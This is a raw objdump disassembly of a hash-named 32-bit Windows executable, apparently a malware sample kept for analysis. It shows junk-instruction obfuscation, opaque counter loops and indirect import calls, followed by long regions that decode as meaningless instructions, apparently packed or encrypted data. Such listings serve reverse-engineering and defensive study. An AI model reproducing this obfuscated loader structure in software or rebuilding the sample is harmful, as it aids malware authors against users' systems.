
d0ecb050325f8259bd989f9727707f92bbb874cf9bca85f2f9e8c36968859ef4.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	mov    DWORD PTR ds:0x434429,0x7186
  401015:	mov    DWORD PTR [ebp-0x20],eax
  401018:	mov    ecx,DWORD PTR [ebp-0x20]
  40101b:	mov    DWORD PTR ds:0x43439e,0x6cee
  401025:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40102c:	mov    DWORD PTR ds:0x4326f0,0x6120
  401036:	cmp    ecx,eax
  401038:	mov    DWORD PTR ds:0x43441d,0x7018
  401042:	jne    0x4019f7
  401048:	mov    ax,WORD PTR [ebp-0x24]
  40104c:	push   esi
  40104d:	mov    DWORD PTR ds:0x4326fc,0x1b
  401057:	cmp    DWORD PTR ds:0x4326fc,0x0
  40105e:	je     0x40108e
  401064:	cmp    DWORD PTR ds:0x4326fc,0x22
  40106b:	jne    0x40107c
  401071:	push   0x432dc2
  401076:	call   DWORD PTR ds:0x4329b2
  40107c:	mov    ecx,DWORD PTR ds:0x4326fc
  401082:	dec    ecx
  401083:	mov    DWORD PTR ds:0x4326fc,ecx
  401089:	jmp    0x401057
  40108e:	mov    ecx,0x8a3e
  401093:	mov    DWORD PTR ds:0x43438a,0x48c
  40109d:	xor    ax,cx
  4010a0:	add    DWORD PTR ds:0x434419,0x61ba
  4010aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4010ad:	xor    esi,DWORD PTR ds:0x434396
  4010b3:	push   edi
  4010b4:	mov    DWORD PTR ds:0x43437a,0x1c
  4010be:	cmp    DWORD PTR ds:0x43437a,0x0
  4010c5:	je     0x401105
  4010cb:	cmp    DWORD PTR ds:0x43437a,0x25
  4010d2:	jne    0x4010f3
  4010d8:	push   0x38d9
  4010dd:	push   DWORD PTR [ebp-0xc]
  4010e0:	push   0x7b63
  4010e5:	push   0x618f
  4010ea:	push   DWORD PTR [ebp-0x28]
  4010ed:	call   DWORD PTR ds:0x4329b6
  4010f3:	mov    edi,DWORD PTR ds:0x43437a
  4010f9:	dec    edi
  4010fa:	mov    DWORD PTR ds:0x43437a,edi
  401100:	jmp    0x4010be
  401105:	mov    edi,0x3b04
  40110a:	xor    DWORD PTR ds:0x432700,edx
  401110:	add    ax,di
  401113:	add    DWORD PTR ds:0x43439a,0xf3f
  40111d:	movzx  eax,ax
  401120:	add    DWORD PTR ds:0x4326f4,edi
  401126:	not    eax
  401128:	or     esi,DWORD PTR ds:0x434411
  40112e:	and    eax,DWORD PTR [ecx]
  401130:	movzx  ecx,WORD PTR ds:0x432dc2
  401137:	xor    DWORD PTR ds:0x432de6,ecx
  40113d:	mov    ecx,DWORD PTR [ebp+0x8]
  401140:	sub    DWORD PTR ds:0x434425,ecx
  401146:	mov    DWORD PTR [ecx],eax
  401148:	adc    ecx,0x6b0b
  40114e:	mov    ecx,0x7510855
  401153:	sbb    esi,DWORD PTR ds:0x432dda
  401159:	mov    esi,0x32729c
  40115e:	sbb    DWORD PTR ds:0x434425,0x3918
  401168:	push   ebx
  401169:	or     DWORD PTR ds:0x4343a2,ebx
  40116f:	mov    ax,WORD PTR [ebp-0x24]
  401173:	dec    ebx
  401174:	movzx  eax,ax
  401177:	mov    DWORD PTR [ebp-0x38],eax
  40117a:	sub    eax,0x1c8b
  40117f:	mov    eax,DWORD PTR [ebp+0x8]
  401182:	mov    DWORD PTR [ebp-0x28],eax
  401185:	xor    eax,eax
  401187:	or     eax,DWORD PTR ds:0x432dce
  40118d:	add    DWORD PTR ds:0x434376,eax
  401193:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  40119a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4011a1:	mov    eax,0x9577
  4011a6:	or     DWORD PTR ds:0x43439a,0x2325
  4011b0:	mov    WORD PTR [ebp-0x4],ax
  4011b4:	movzx  ebx,BYTE PTR ds:0x4326f4
  4011bb:	or     DWORD PTR ds:0x4326f0,ebx
  4011c1:	lea    eax,[ebp-0x30]
  4011c4:	mov    DWORD PTR [ebp-0x34],eax
  4011c7:	mov    eax,DWORD PTR [ebp-0x28]
  4011ca:	mov    DWORD PTR [ebp-0x2c],eax
  4011cd:	add    DWORD PTR ds:0x434419,0x693e
  4011d7:	lea    eax,[ebp-0x18]
  4011da:	and    DWORD PTR ds:0x43436a,0x0
  4011e4:	jmp    0x4011f6
  4011e9:	mov    ebx,DWORD PTR ds:0x43436a
  4011ef:	inc    ebx
  4011f0:	mov    DWORD PTR ds:0x43436a,ebx
  4011f6:	cmp    DWORD PTR ds:0x43436a,0x18
  4011fd:	jae    0x40123a
  401203:	cmp    DWORD PTR ds:0x43436a,0x8
  40120a:	jne    0x40121b
  401210:	push   0x7a50
  401215:	call   DWORD PTR ds:0x4329ba
  40121b:	cmp    DWORD PTR ds:0x43436a,0x7
  401222:	jne    0x401235
  401228:	mov    ebx,DWORD PTR ds:0x43436a
  40122e:	inc    ebx
  40122f:	mov    DWORD PTR ds:0x43436a,ebx
  401235:	jmp    0x4011e9
  40123a:	mov    DWORD PTR [ebp-0x1c],eax
  40123d:	mov    eax,DWORD PTR [ebp-0x1c]
  401240:	mov    DWORD PTR [eax],0xf89f2da9
  401246:	mov    eax,DWORD PTR [ebp-0x14]
  401249:	mov    ebx,DWORD PTR [ebp-0x8]
  40124c:	and    DWORD PTR ds:0x434415,0x66ce
  401256:	xor    eax,ecx
  401258:	xor    ebx,ecx
  40125a:	and    DWORD PTR ds:0x434419,0x3a0f
  401264:	xor    edx,edx
  401266:	and    DWORD PTR ds:0x432de6,0x4326f0
  401270:	add    eax,esi
  401272:	mov    DWORD PTR ds:0x43441d,0x1b71
  40127c:	add    ebx,esi
  40127e:	div    ebx
  401280:	mov    DWORD PTR ds:0x434376,0x5747
  40128a:	mov    edx,DWORD PTR [ebp-0x2c]
  40128d:	mov    DWORD PTR ds:0x4326f4,0x57da
  401297:	cmp    eax,DWORD PTR [edx]
  401299:	mov    DWORD PTR ds:0x434382,0x6b31
  4012a3:	je     0x4019ca
  4012a9:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  4012b0:	lea    eax,[ebp-0xc]
  4012b3:	sbb    edx,DWORD PTR ds:0x432dca
  4012b9:	mov    DWORD PTR [ebp-0x10],eax
  4012bc:	mov    eax,DWORD PTR [ebp-0x10]
  4012bf:	jmp    0x401447
  4012c4:	popa   
  4012c5:	xchg   BYTE PTR ds:0x6151e949,cl
  4012cb:	mov    dh,0x3f
  4012cd:	mov    ah,0xd5
  4012cf:	mov    dl,0x9c
  4012d1:	loope  0x40132c
  4012d3:	xchg   DWORD PTR [eax+0x70],esi
  4012d6:	jo     0x401348
  4012d8:	in     eax,0x7f
  4012da:	jo     0x40134c
  4012dc:	rcl    bh,0x3d
  4012df:	aad    0x39
  4012e1:	ror    edi,cl
  4012e3:	rol    eax,1
  4012e5:	pop    es
  4012e6:	push   es
  4012e7:	add    ecx,DWORD PTR [edi]
  4012e9:	add    cl,BYTE PTR gs:[edi]
  4012ec:	xor    ecx,DWORD PTR [edi]
  4012ee:	ret    0xc71a
  4012f1:	adc    bl,BYTE PTR [edi]
  4012f3:	mov    ecx,0xddb7025a
  4012f8:	add    bh,ch
  4012fa:	mov    ebp,0x8003c8db
  4012ff:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401305:	lods   eax,DWORD PTR ds:[esi]
  401306:	sar    BYTE PTR [eax+0x6fee581f],1
  40130c:	or     edx,DWORD PTR [ecx]
  40130e:	sahf   
  40130f:	jp     0x4012d9
  401311:	inc    edx
  401312:	lods   al,BYTE PTR ds:[esi]
  401313:	push   ebx
  401314:	sub    eax,0xad3ec6d1
  401319:	mov    WORD PTR [ebx-0x3b],?
  40131c:	stos   DWORD PTR es:[edi],eax
  40131d:	js     0x4012e5
  40131f:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401325:	jmp    0x401359
  401327:	mov    ebp,ecx
  401329:	dec    edi
  40132a:	fcomp  DWORD PTR [eax-0x656800bf]
  401330:	pop    es
  401331:	test   eax,0xed4dbddc
  401336:	sub    BYTE PTR [ebp+0x23],dl
  401339:	mov    ah,0xec
  40133b:	pusha  
  40133c:	nop
  40133d:	mov    esi,0x94c3117b
  401342:	and    esi,edx
  401344:	jmp    0x401396
  401346:	(bad)  
  401347:	out    0xba,al
  401349:	repnz in al,dx
  40134b:	xchg   esp,eax
  40134c:	xor    edi,ecx
  40134e:	jbe    0x4013b5
  401350:	xlat   BYTE PTR ds:[ebx]
  401351:	and    cl,ch
  401353:	add    al,0xd9
  401355:	adc    DWORD PTR [ecx-0x68],edx
  401358:	xor    eax,0x7a616f03
  40135d:	or     dh,BYTE PTR [ecx]
  40135f:	fld    QWORD PTR [eax+0x7f752a56]
  401365:	xor    BYTE PTR [edi+0xba8db0c],cl
  40136b:	pop    ebx
  40136c:	push   ebp
  40136d:	(bad)  
  40136f:	or     ebx,edx
  401371:	pop    esi
  401372:	fstp   DWORD PTR [ecx]
  401374:	jno    0x401306
  401376:	mov    eax,0x2b15374b
  40137b:	ja     0x4013a6
  40137d:	sbb    al,0xd3
  40137f:	xor    BYTE PTR [edi-0x16],cl
  401382:	into   
  401383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401385:	fs stc 
  401387:	lods   al,BYTE PTR ds:[esi]
  401388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401389:	or     edi,DWORD PTR [eax]
  40138b:	jecxz  0x4013ab
  40138d:	mov    WORD PTR [eax-0x13ac7331],?
  401393:	loope  0x4013b4
  401395:	or     ah,ch
  401397:	pop    ds
  401398:	cmp    al,0x51
  40139a:	in     al,0x97
  40139c:	fsub   st,st(4)
  40139e:	pop    ebx
  40139f:	jne    0x4013e1
  4013a1:	push   esi
  4013a2:	fcmovne st,st(3)
  4013a4:	xor    BYTE PTR [eax-0x1b],dl
  4013a7:	push   ds
  4013a8:	rcr    DWORD PTR [ebx+0x26],cl
  4013ab:	mov    edi,ebp
  4013ad:	nop
  4013ae:	and    cl,cl
  4013b0:	lahf   
  4013b1:	and    eax,0x6a619d83
  4013b6:	inc    ebx
  4013b7:	sub    al,0x81
  4013b9:	cld    
  4013ba:	mov    WORD PTR [ecx-0x9],gs
  4013bd:	and    ebp,ebx
  4013bf:	mov    ecx,0x94d800db
  4013c4:	fldenv [esp+edi*1-0x43]
  4013c8:	mov    ebx,0xc45c23aa
  4013cd:	daa    
  4013ce:	sar    DWORD PTR [ecx-0x62c2e24b],0x50
  4013d5:	das    
  4013d6:	mov    al,0xa7
  4013d8:	in     eax,0x79
  4013da:	pop    ss
  4013db:	les    ebx,FWORD PTR [edx]
  4013dd:	adc    ah,bl
  4013df:	mov    ah,0x2a
  4013e1:	ins    DWORD PTR es:[edi],dx
  4013e2:	mov    ds:0xa1ac0ff6,eax
  4013e7:	xor    BYTE PTR [edi],cl
  4013e9:	cmp    al,0x1b
  4013eb:	fcom   st(7)
  4013ed:	rcl    BYTE PTR [esi-0x6deda498],0x8f
  4013f4:	adc    BYTE PTR [ebx-0x1b],bh
  4013f7:	fidivr WORD PTR [ecx+0xc]
  4013fa:	dec    eax
  4013fb:	cmp    ch,BYTE PTR [ecx+0x37d072be]
  401401:	pop    ds
  401402:	js     0x4013ec
  401404:	sub    BYTE PTR [edi-0x442367ac],ah
  40140a:	pop    ebp
  40140b:	adc    BYTE PTR [ecx],ch
  40140d:	out    0x2a,al
  40140f:	inc    esi
  401410:	dec    DWORD PTR [ebx+0x1e]
  401413:	out    0x30,eax
  401415:	mov    esi,0x7a17a3a6
  40141a:	inc    ebx
  40141b:	dec    edx
  40141c:	stos   BYTE PTR es:[edi],al
  40141d:	(bad)  
  40141e:	fbld   TBYTE PTR gs:[edi+eiz*8-0x7a12df2d]
  401426:	inc    edi
  401427:	out    dx,eax
  401428:	push   es
  401429:	pop    ecx
  40142a:	dec    edx
  40142b:	adc    BYTE PTR [esi-0x1],0x1d
  40142f:	(bad)
  401432:	sbb    DWORD PTR [eax],ebx
  401434:	mov    ebx,0xc959fb9f
  401439:	jno    0x401447
  40143b:	in     eax,dx
  40143c:	jmp    0xaf50:0x7771c6b2
  401443:	sbb    bl,0xc7
  401446:	or     DWORD PTR [ebx-0x132d96f0],0xffffffa9
  40144d:	sahf   
  40144e:	clc    
  40144f:	mov    DWORD PTR [eax],edx
  401451:	mov    eax,DWORD PTR [ebp-0xc]
  401454:	cmp    eax,0x742b26d4
  401459:	jmp    0x4015e1
  40145e:	push   ds
  40145f:	fcmovnb st,st(2)
  401461:	mov    edx,0x5ba661c1
  401466:	xlat   BYTE PTR ds:[ebx]
  401467:	les    ecx,FWORD PTR [esi]
  401469:	test   DWORD PTR [eax],edx
  40146b:	mov    ecx,0x7fe50469
  401470:	jo     0x4014e2
  401472:	in     eax,0x7f
  401474:	jo     0x4014e6
  401476:	js     0x4014a5
  401478:	daa    
  401479:	in     eax,0x6c
  40147b:	push   0xaead0063
  401480:	ja     0x4014b1
  401482:	mov    esi,0xee5070c
  401487:	mov    BYTE PTR [eax+esi*1-0xf],dl
  40148b:	dec    ecx
  40148c:	mov    esp,0x3232ff77
  401491:	push   ebp
  401492:	repnz pop eax
  401494:	mov    es,WORD PTR [esi]
  401496:	sbb    esi,eax
  401498:	dec    edi
  401499:	jbe    0x4014a7
  40149b:	add    edi,ebp
  40149d:	aad    0xe5
  40149f:	(bad)  
  4014a0:	(bad)  
  4014a1:	lock mov ebp,0xcc0f5415
  4014a7:	pusha  
  4014a8:	retf   
  4014a9:	inc    esi
  4014aa:	mov    dh,0xe7
  4014ac:	das    
  4014ad:	ja     0x40146c
  4014af:	inc    eax
  4014b0:	mov    dh,0x9d
  4014b2:	jle    0x401526
  4014b4:	shl    BYTE PTR [ecx-0x25],0xd0
  4014b8:	adc    dh,ch
  4014ba:	jne    0x401529
  4014bc:	sbb    dl,cl
  4014be:	lods   eax,DWORD PTR ds:[esi]
  4014bf:	pop    ebx
  4014c0:	dec    edx
  4014c1:	dec    edi
  4014c2:	mov    ch,0x4f
  4014c4:	out    0x37,al
  4014c6:	shr    ebp,cl
  4014c8:	aam    0x44
  4014ca:	adc    DWORD PTR [edx+0x7cbd8854],eax
  4014d0:	test   BYTE PTR [edx-0x21],0xa
  4014d4:	mov    ah,0xb9
  4014d6:	jmp    0x79c64b22
  4014db:	dec    ebx
  4014dc:	jmp    0x39bb7498
  4014e1:	cmp    al,0x4
  4014e3:	push   es
  4014e4:	and    al,0xbc
  4014e6:	jl     0x401485
  4014e8:	or     bl,BYTE PTR [esi-0x32]
  4014eb:	xchg   esp,eax
  4014ec:	or     eax,0xe8eef0de
  4014f1:	jg     0x4014ac
  4014f3:	and    eax,0x3e8e2612
  4014f8:	retf   
  4014f9:	sbb    dh,ah
  4014fb:	push   ds
  4014fc:	iret   
  4014fd:	out    0xbc,eax
  4014ff:	(bad)  
  401500:	in     eax,0x73
  401502:	imul   esi,ebp,0x2d
  401505:	or     bl,BYTE PTR [eax]
  401507:	sub    cl,BYTE PTR [esi+0x5]
  40150a:	add    dl,al
  40150c:	jnp    0x401529
  40150e:	push   ss
  40150f:	sbb    al,0x1c
  401511:	pop    ecx
  401512:	jge    0x4014c2
  401514:	cmp    eax,0x9d8bdd6e
  401519:	adc    eax,0x2f7dff49
  40151e:	cmc    
  40151f:	out    dx,eax
  401520:	mov    al,ds:0x80601012
  401525:	or     eax,0x1551af33
  40152a:	ds aam 0x66
  40152d:	fiadd  WORD PTR [ebp-0x79cac9]
  401533:	ffreep st(5)
  401535:	fwait
  401536:	cmp    BYTE PTR ds:0x4f73efd,ah
  40153c:	mov    esi,0xc72fd94b
  401541:	retf   
  401542:	sbb    dh,BYTE PTR [ecx+eiz*4+0x7aa2a855]
  401549:	pop    es
  40154a:	mov    fs,WORD PTR [ebx+0x4d]
  40154d:	clc    
  40154e:	bound  edi,QWORD PTR [esi-0x1ae456f7]
  401554:	test   al,0x64
  401556:	xor    al,0x81
  401558:	sub    BYTE PTR [edi-0x25744d11],dh
  40155e:	jg     0x40150f
  401560:	xchg   esp,eax
  401561:	arpl   WORD PTR [eax+0x24],sp
  401564:	cmp    BYTE PTR ds:0x3be34f0b,0xab
  40156b:	sbb    al,0x16
  40156d:	cmp    BYTE PTR [ebx],dh
  40156f:	into   
  401570:	das    
  401571:	and    bl,ah
  401573:	fmul   QWORD PTR [edx-0x2b]
  401576:	div    BYTE PTR [ecx]
  401578:	inc    edi
  401579:	xor    eax,0x48a3e043
  40157e:	(bad)  
  40157f:	stc    
  401580:	outs   dx,BYTE PTR ds:[esi]
  401581:	add    esp,edi
  401583:	cmp    al,0x20
  401585:	push   cs
  401586:	and    eax,DWORD PTR [edx-0x1b]
  401589:	or     esi,DWORD PTR [esi+0x1f47197e]
  40158f:	jmp    0xdcdaf575
  401594:	test   al,0xbe
  401596:	in     al,0x7
  401598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401599:	xchg   edi,eax
  40159a:	imul   esi,DWORD PTR [edi+ebp*8-0x10e58fcc],0x69
  4015a2:	adc    bh,BYTE PTR [edi+0x51]
  4015a5:	dec    ecx
  4015a6:	cmc    
  4015a7:	arpl   si,di
  4015a9:	pop    edi
  4015aa:	add    BYTE PTR [ecx+0x1bd74e5b],dh
  4015b0:	xor    BYTE PTR [ebp-0x6c],cl
  4015b3:	out    dx,al
  4015b4:	push   0xffffffa9
  4015b6:	das    
  4015b7:	mov    ds:0xe1c834fa,eax
  4015bc:	in     al,dx
  4015bd:	aas    
  4015be:	cdq    
  4015bf:	(bad)  
  4015c1:	stos   DWORD PTR es:[edi],eax
  4015c2:	imul   esp,ecx,0xf0d32018
  4015c8:	stos   BYTE PTR es:[edi],al
  4015c9:	pop    ecx
  4015ca:	and    DWORD PTR [edx+0x764ab0ce],eax
  4015d0:	sub    eax,0xfd06a1cb
  4015d5:	cmp    al,BYTE PTR [ebx-0x6674b935]
  4015db:	jmp    0x401587
  4015dd:	pop    ds
  4015de:	push   es
  4015df:	push   esi
  4015e0:	mov    ds:0xe840f,al
  4015e5:	add    BYTE PTR [eax],al
  4015e7:	mov    eax,DWORD PTR [ebp-0x1c]
  4015ea:	or     DWORD PTR [eax],0x60751c9c
  4015f0:	jmp    0x4019d9
  4015f5:	mov    eax,DWORD PTR [ebp-0xc]
  4015f8:	add    eax,DWORD PTR [ebp-0x18]
  4015fb:	cmp    eax,0x6cca547d
  401600:	je     0x401614
  401606:	mov    eax,DWORD PTR [ebp-0x10]
  401609:	and    DWORD PTR [eax],0x751c99
  40160f:	jmp    0x4019d9
  401614:	mov    eax,DWORD PTR [ebp-0xc]
  401617:	mov    edx,DWORD PTR [ebp-0x18]
  40161a:	or     eax,edx
  40161c:	cmp    eax,0xfcbf2ffd
  401621:	je     0x401635
  401627:	mov    eax,DWORD PTR [ebp-0x10]
  40162a:	xor    DWORD PTR [eax],0x2650fa8f
  401630:	jmp    0x4019d9
  401635:	mov    ax,WORD PTR [ebp-0x4]
  401639:	mov    edx,0x8a3e
  40163e:	xor    ax,dx
  401641:	mov    edx,DWORD PTR [ebp-0x28]
  401644:	mov    edx,DWORD PTR [edx]
  401646:	add    ax,di
  401649:	cmp    ax,WORD PTR [edx]
  40164c:	je     0x401821
  401652:	mov    eax,DWORD PTR [ebp-0x14]
  401655:	xor    eax,ecx
  401657:	add    eax,esi
  401659:	mov    DWORD PTR [ebp-0x30],eax
  40165c:	mov    eax,DWORD PTR [ebp-0x34]
  40165f:	mov    dx,WORD PTR [ebp-0x38]
  401663:	mov    ebx,0x8a3e
  401668:	xor    dx,bx
  40166b:	mov    ebx,DWORD PTR [ebp-0x8]
  40166e:	add    dx,di
  401671:	jmp    0x4017f9
  401676:	clc    
  401677:	repnz sbb eax,0xa851698d
  40167d:	icebp  
  40167e:	pusha  
  40167f:	xchg   ebx,eax
  401680:	rcl    DWORD PTR [ebx-0x59],1
  401683:	fstp   DWORD PTR [eax]
  401685:	dec    BYTE PTR [edx+0x7e]
  401688:	jo     0x4016fa
  40168a:	in     eax,0x7f
  40168c:	jo     0x4016fe
  40168e:	inc    ebx
  40168f:	call   0xc1bd:0xbd9547b1
  401696:	push   ds
  401697:	adc    dl,BYTE PTR [ebx+0x66a94db8]
  40169d:	rol    BYTE PTR [edi],1
  40169f:	push   edi
  4016a0:	sbb    ah,ch
  4016a2:	std    
  4016a3:	add    ebp,DWORD PTR ds:0x4225b91c
  4016a9:	scas   eax,DWORD PTR es:[edi]
  4016aa:	outs   dx,BYTE PTR ds:[esi]
  4016ab:	mov    bl,0x4c
  4016ad:	(bad)  
  4016ae:	push   esi
  4016af:	loopne 0x4016ea
  4016b1:	sbb    DWORD PTR [ebx-0x24],ebx
  4016b4:	int3   
  4016b5:	jmp    0x401720
  4016b7:	mov    dl,0x7b
  4016b9:	clc    
  4016ba:	stos   BYTE PTR es:[edi],al
  4016bb:	stos   BYTE PTR es:[edi],al
  4016bc:	ss mov esi,0xe1caaae6
  4016c2:	imul   DWORD PTR [ecx+0x52454391]
  4016c8:	xchg   edi,eax
  4016c9:	mov    dl,0xc8
  4016cb:	dec    eax
  4016cc:	hlt    
  4016cd:	inc    esp
  4016ce:	shl    DWORD PTR [edi-0x3b],cl
  4016d1:	jb     0x40170b
  4016d3:	mov    edi,0x69f7e783
  4016d8:	jmp    0x40172d
  4016da:	mov    cl,0xb7
  4016dc:	jg     0x401698
  4016de:	mov    edi,0xf3de97b2
  4016e3:	test   BYTE PTR [ebx+0x25],al
  4016e6:	dec    ebp
  4016e7:	mov    eax,0xcb6e24fc
  4016ec:	cmp    al,0xa9
  4016ee:	jmp    0x9bba29a9
  4016f3:	ds (bad) 
  4016f6:	cld    
  4016f7:	fnsetpm(287 only) 
  4016f9:	cmp    eax,0xd4e12f96
  4016fe:	lahf   
  4016ff:	fimul  WORD PTR [ebp-0x6fa197e9]
  401705:	loop   0x401724
  401707:	test   al,0xad
  401709:	imul   DWORD PTR [edx]
  40170b:	fs scas eax,DWORD PTR es:[edi]
  40170d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40170e:	dec    edx
  40170f:	leave  
  401710:	mov    ch,0xfc
  401712:	adc    eax,0xa6674e59
  401717:	sbb    al,0x7
  401719:	ss push ds
  40171b:	adc    DWORD PTR gs:[eax-0x723012fe],0x7f5dc6b4
  401726:	nop
  401727:	pop    ecx
  401728:	test   DWORD PTR ds:0xa19a04f0,esp
  40172e:	push   0x3e
  401730:	ja     0x4016eb
  401732:	fild   WORD PTR [esi]
  401734:	mov    cl,0xf0
  401736:	mov    ebx,0xdb2e3a06
  40173b:	std    
  40173c:	pop    ebp
  40173d:	mov    esi,0x461e7def
  401742:	cmp    eax,0x9af86da1
  401747:	or     DWORD PTR [ebx+0x11],0xffffff95
  40174b:	pop    ds
  40174c:	jg     0x4016e7
  40174e:	pop    esp
  40174f:	inc    DWORD PTR [ecx-0x7a]
  401752:	(bad)  
  401753:	leave  
  401754:	add    BYTE PTR [ebp+0x5576b303],ch
  40175a:	push   esp
  40175b:	fistp  WORD PTR [esi]
  40175d:	scas   al,BYTE PTR es:[edi]
  40175e:	jb     0x401709
  401760:	push   edi
  401761:	jp     0x4017b0
  401763:	mulsd  xmm1,QWORD PTR [eax+ebx*8]
  401768:	mov    eax,ds:0xba41fa52
  40176d:	xor    eax,0x42fd4c35
  401772:	divps  xmm2,xmm4
  401775:	(bad)  
  401777:	sub    BYTE PTR [eax-0x5],dl
  40177a:	jge    0x401734
  40177c:	das    
  40177d:	cmp    ch,ah
  40177f:	int    0x1b
  401781:	adc    DWORD PTR [eax],0x72
  401784:	scas   eax,DWORD PTR es:[edi]
  401785:	repnz sub DWORD PTR [ebx+ebx*4-0x14],esi
  40178a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40178b:	sub    eax,0x6bba5240
  401790:	add    edi,DWORD PTR [edi-0x6b]
  401793:	rcl    DWORD PTR [ebx+0x7a],1
  401796:	push   ebp
  401797:	div    BYTE PTR ds:0xfd462e13
  40179d:	jecxz  0x401795
  40179f:	inc    eax
  4017a0:	stos   DWORD PTR es:[edi],eax
  4017a1:	cmp    ebp,DWORD PTR ds:0x9532def7
  4017a7:	sar    DWORD PTR [ebp+0x93778fe],cl
  4017ad:	inc    edx
  4017ae:	add    BYTE PTR [ebx-0x3d2ee464],al
  4017b4:	xchg   ebp,eax
  4017b5:	pop    ebp
  4017b6:	inc    ebx
  4017b7:	test   eax,0xc6879f05
  4017bc:	push   0x4
  4017be:	sbb    DWORD PTR [ecx],ebx
  4017c0:	and    eax,0x337a4355
  4017c5:	pusha  
  4017c6:	pop    eax
  4017c7:	xor    al,0x71
  4017c9:	pop    edx
  4017ca:	xchg   BYTE PTR [edi-0x3d],cl
  4017cd:	mov    dh,BYTE PTR [esi]
  4017cf:	dec    ebx
  4017d0:	stc    
  4017d1:	or     DWORD PTR [ecx],ecx
  4017d3:	mov    esi,0x9aab442d
  4017d8:	sbb    al,0xa0
  4017da:	mov    edi,0x9bc329cd
  4017df:	je     0x401818
  4017e1:	sbb    DWORD PTR [ecx-0x6b],eax
  4017e4:	pusha  
  4017e5:	or     edi,ebp
  4017e7:	pop    ebx
  4017e8:	mov    dh,0xe0
  4017ea:	or     edi,0xffffffd1
  4017ed:	mov    DWORD PTR [ecx+eiz*2],ebp
  4017f0:	outs   dx,BYTE PTR ds:[esi]
  4017f1:	out    0x34,al
  4017f3:	pop    ss
  4017f4:	mov    al,0x5e
  4017f6:	jecxz  0x4017c3
  4017f8:	mov    ebx,0x33d2b70f
  4017fd:	(bad)  [ebp+0x729c1a94]
  401803:	xor    al,BYTE PTR [eax]
  401805:	add    DWORD PTR [eax],edx
  401807:	mov    eax,DWORD PTR [ebp-0x2c]
  40180a:	mov    edx,DWORD PTR [ebp-0x8]
  40180d:	mov    ebx,DWORD PTR [ebp-0x30]
  401810:	xor    edx,ecx
  401812:	add    edx,esi
  401814:	imul   edx,ebx
  401817:	sub    DWORD PTR [eax],edx
  401819:	mov    eax,DWORD PTR [ebp-0x14]
  40181c:	jmp    0x4019dc
  401821:	mov    eax,DWORD PTR [ebp-0xc]
  401824:	mov    edx,DWORD PTR [ebp-0x18]
  401827:	jmp    0x4019af
  40182c:	pop    ebx
  40182d:	arpl   di,di
  40182f:	out    dx,eax
  401830:	xchg   ebx,esi
  401832:	imul   esi,DWORD PTR [ebx-0x5d],0x7d
  401836:	jae    0x401839
  401838:	stos   BYTE PTR es:[edi],al
  401839:	dec    edi
  40183a:	jmp    0x70bc5762
  40183f:	jo     0x401826
  401841:	jg     0x4018b3
  401843:	jo     0x401801
  401845:	cmc    
  401846:	add    DWORD PTR [esi],edi
  401848:	xor    DWORD PTR [eax],edx
  40184a:	sub    ebx,DWORD PTR [edx+0x69]
  40184d:	push   ss
  40184e:	cdq    
  40184f:	jae    0x4018aa
  401851:	mov    ebx,0x5b38584a
  401856:	inc    esi
  401857:	adc    eax,0xfc00854e
  40185c:	pop    ebp
  40185d:	(bad)  
  40185e:	jmp    0x3e12:0xd69a34a7
  401865:	push   0xdb4c32c3
  40186a:	hlt    
  40186b:	push   ebp
  40186c:	inc    esp
  40186d:	inc    ecx
  40186e:	push   edx
  40186f:	fist   DWORD PTR [esi]
  401871:	pusha  
  401872:	mov    esp,DWORD PTR [ecx-0x39f11bf4]
  401878:	test   al,0x8
  40187a:	sti    
  40187b:	rcl    ebx,0xc1
  40187e:	and    ebp,esi
  401880:	xchg   DWORD PTR [esi+0x1a],ebp
  401883:	daa    
  401884:	mov    bh,0xa9
  401886:	xchg   ecx,eax
  401887:	rcl    DWORD PTR [ebx],cl
  401889:	loop   0x40187f
  40188b:	adc    ecx,edi
  40188d:	pop    esi
  40188e:	dec    ecx
  40188f:	mov    eax,ds:0x72830a25
  401894:	fdiv   DWORD PTR es:[ebx+0x50169007]
  40189b:	push   edi
  40189c:	jecxz  0x4018bc
  40189e:	or     eax,0xcc255ecd
  4018a3:	ror    DWORD PTR [edi+eiz*8+0x7b],0x61
  4018a8:	xchg   esi,eax
  4018a9:	lds    ebx,FWORD PTR [ecx]
  4018ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018ac:	adc    bh,cl
  4018ae:	mov    ch,0x26
  4018b0:	xchg   edi,eax
  4018b1:	imul   ebp,DWORD PTR [edi+0x30],0xffffffd2
  4018b5:	xchg   edi,eax
  4018b6:	and    BYTE PTR [ebx-0x2],dh
  4018b9:	push   ebp
  4018ba:	pop    ebx
  4018bb:	push   esp
  4018bc:	push   eax
  4018bd:	push   esp
  4018be:	add    ebx,DWORD PTR [ebx+0x7ff83c29]
  4018c4:	int3   
  4018c5:	fmul   QWORD PTR ds:0x20383e8f
  4018cb:	imul   ebx,DWORD PTR [eax-0x30d5e641],0xb8945391
  4018d5:	sub    al,0xf0
  4018d7:	clc    
  4018d8:	push   esi
  4018d9:	aaa    
  4018da:	pop    ebp
  4018db:	cs rol al,cl
  4018de:	enter  0x5022,0xc3
  4018e2:	repnz stos BYTE PTR es:[edi],al
  4018e4:	ds jmp 0x3cc8040d
  4018ea:	xchg   edx,eax
  4018eb:	std    
  4018ec:	mov    bh,0x5d
  4018ee:	ret    0x2389
  4018f1:	cmp    BYTE PTR [ecx+0x36],0x17
  4018f5:	test   al,0x5d
  4018f7:	mov    ebp,eax
  4018f9:	sbb    esi,esi
  4018fb:	mov    ah,0xe6
  4018fd:	inc    esp
  4018fe:	test   eax,0x547a343e
  401903:	neg    BYTE PTR [esi]
  401905:	sbb    al,ah
  401907:	pop    ds
